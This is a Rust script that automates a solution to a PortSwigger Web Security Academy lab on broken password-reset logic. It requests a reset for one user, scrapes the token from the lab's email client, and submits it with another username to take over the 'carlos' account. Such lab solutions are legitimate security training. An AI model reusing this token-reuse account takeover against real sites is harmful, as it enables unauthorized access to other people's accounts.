/****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 26/8/2023
*
* PortSwigger LAB: Password reset broken logic
*
* Steps: 1. Send forgot-password request as wiener
*        2. Extract the token from the email client
*        3. Send change-password request as carlos
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    let url = "https://0aa4008704cbed1182e95b8000d200d9.web-security-academy.net"; // change this URL to your lab
    let email_client = "https://exploit-0a6f00cf041fed2082ce5a14012f00df.exploit-server.net/email"; // change this URL to your lab
    let client = build_client(); // build the client

    let post_forgot_password = client
        .post(format!("{url}/forgot-password"))
        .form(&HashMap::from([("username", "wiener")]))
        .send(); // make a forgot-password request as wiener
    if let Ok(post_res) = post_forgot_password {
        // if request is OK
        println!(
            "{}",
            "1. Send forgot-password request as wiener.. ☑️"
                .white()
                .bold()
        );
        let get_email_client = client.get(email_client).send(); // get the email client page to extract toke from
        if let Ok(get_res) = get_email_client {
            // if request is OK
            let token =
                extract_pattern("temp-forgot-password-token=(.*)'", &get_res.text().unwrap()); // extract the token from the page
            let new_password = "Hacked"; // change the password to what you want
            println!(
                "{}",
                "2. Extract the token from the email client.. ☑️"
                    .white()
                    .bold()
            );
            let post_change_password = client
                .post(format!("{url}/forgot-password"))
                .form(&HashMap::from([
                    ("temp-forgot-password-token", token),
                    ("username", "carlos".to_string()),
                    ("new-password-1", new_password.to_string()),
                    ("new-password-2", new_password.to_string()),
                ]))
                .send(); // make a change-password request as carlos
            if let Ok(change_res) = post_change_password {
                // if requst is OK
                println!(
                    "{}",
                    "3. Send change-password request as carlos.. ☑️"
                        .white()
                        .bold()
                );
                println!(
                    "{}: {}",
                    "Carlos password changed succussfully to".green().bold(),
                    new_password.green().bold()
                )
            } else {
                println!("{}", "Change password request has failed".red().bold());
            }
        } else {
            println!("{}", "Extract token request has failed".red().bold());
        }
    } else {
        println!("{}", "Forgot password request has failed".red().bold());
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
